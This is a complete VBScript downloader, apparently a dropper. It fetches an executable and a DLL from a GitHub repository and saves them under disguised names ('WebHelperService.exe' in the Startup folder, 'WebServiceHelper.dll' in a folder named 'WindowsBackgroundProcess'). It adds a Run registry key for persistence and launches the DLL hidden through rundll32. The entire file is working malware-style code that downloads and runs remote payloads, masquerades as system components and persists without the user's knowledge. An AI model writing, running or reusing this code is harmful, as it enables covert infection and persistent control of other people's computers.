Dim url1, url2, destination1, destination2
url1 = "https://github.com/geoffary/Downloader/raw/main/PrankMessage_MS.exe"
url2 = "https://github.com/geoffary/Downloader/raw/main/Ghelloworld.dll"

Set objShell = CreateObject("WScript.Shell")
startupFolder = objShell.SpecialFolders("Startup")
destination1 = startupFolder & "\WebHelperService.exe"

Set objFSO = CreateObject("Scripting.FileSystemObject")
appDataFolder = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
folderPath = appDataFolder & "\WindowsBackgroundProcess"

' Create the new folder
If Not objFSO.FolderExists(folderPath) Then
    objFSO.CreateFolder(folderPath)
End If

destination2 = folderPath & "\WebServiceHelper.dll"

Dim objHTTP, objStream
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")

' Download the first file
objHTTP.Open "GET", url1, False
objHTTP.Send

If objHTTP.Status = 200 Then ' HTTP status code 200 means success
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1 ' Binary
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile destination1, 2 ' Overwrite the existing file
    objStream.Close
    Set objStream = Nothing
End If

' Download the second file
Set objStream = CreateObject("ADODB.Stream")
objHTTP.Open "GET", url2, False
objHTTP.Send

If objHTTP.Status = 200 Then ' HTTP status code 200 means success
    objStream.Open
    objStream.Type = 1 ' Binary
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile destination2, 2 ' Overwrite the existing file
    objStream.Close
    Set objStream = Nothing
End If

strKeyPath = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\"
Set objWshReg= CreateObject("WScript.Shell")

objWshReg.RegWrite strKeyPath & "MyProgram", destination1, "REG_SZ"

Set objHTTP = Nothing

' Run the DLL
Dim cmd
cmd = "cmd /c start /B rundll32 " & destination2 & ",Execute"
objShell.Run cmd, 0, False
